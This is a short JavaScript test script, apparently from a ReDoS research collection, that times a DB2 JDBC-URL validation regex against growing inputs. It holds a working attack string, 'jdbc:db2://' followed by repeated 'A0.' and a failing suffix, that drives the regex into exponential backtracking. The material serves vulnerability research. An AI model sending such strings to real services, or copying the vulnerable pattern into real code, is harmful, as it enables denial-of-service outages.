/* 3256
 * ^jdbc:db2://((?:(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?))|(?:(?:(?:(?:[A-Z|a-z])(?:[\w|-]){0,61}(?:[\w]?[.]))*)(?:(?:[A-Z|a-z])(?:[\w|-]){0,61}(?:[\w]?)))):([0-9]{1,5})/([0-9|A-Z|a-z|_|#|$]{1,16})$
 * EXPONENT
 * nums:3
 * EXPONENT AttackString:"jdbc:db2://"+"A0."*32+"! _1_EOA(i or ii)"
 */
var REGEX = new RegExp("^jdbc:db2://((?:(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?))|(?:(?:(?:(?:[A-Z|a-z])(?:[\w|-]){0,61}(?:[\w]?[.]))*)(?:(?:[A-Z|a-z])(?:[\w|-]){0,61}(?:[\w]?)))):([0-9]{1,5})/([0-9|A-Z|a-z|_|#|$]{1,16})$")
for(var i = 1; i <= 5000000; i++) {
    var time = Date.now();
    var attack_str = 'jdbc:db2://' + 'A0.'.repeat(i*1) + '! _1_EOA(i or ii)'
    REGEX.exec(attack_str)
    // REGEX.test(attack_str);
    // attack_str.search(REGEX)
    // attack_str.match(REGEX)
    var time_cost = Date.now() - time;
    console.log(i * 1 + ": " + time_cost+" ms")
}